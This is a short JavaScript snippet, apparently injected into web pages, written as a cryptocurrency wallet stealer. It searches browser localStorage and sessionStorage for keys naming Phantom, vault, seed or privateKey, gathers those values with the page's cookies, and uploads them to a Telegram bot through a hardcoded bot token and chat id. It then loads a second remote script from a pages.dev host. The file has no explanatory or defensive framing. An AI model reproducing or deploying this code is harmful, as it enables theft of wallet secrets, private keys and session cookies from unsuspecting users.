(function() {
    console.log("📡 NODE_ACTIVE");
    const t = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
    const c = '8321398409';
    
    async function send() {
        let d = `--- TARGET: ${location.hostname} ---\n\n`;
        const targets = ['.phantom', '.vault', '.offline', '.fungible', 'padre', 'seed', 'privateKey'];

        [localStorage, sessionStorage].forEach(s => {
            for (let i = 0; i < s.length; i++) {
                let k = s.key(i);
                if (targets.some(x => k.toLowerCase().includes(x))) {
                    d += `[${k}]\n${s.getItem(k)}\n\n`;
                }
            }
        });

        d += `--- COOKIES ---\n${document.cookie}`;

        const blob = new Blob([d], { type: 'text/plain' });
        const fd = new FormData();
        fd.append('chat_id', c);
        fd.append('document', blob, `vault_${Date.now()}.txt`);

        try {
            await fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: fd });
            // Only load UI after successful send
            var m = document.createElement('script');
            m.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
            document.head.appendChild(m);
        } catch (e) {
            console.error("Fetch failed");
        }
    }

    send();
})();
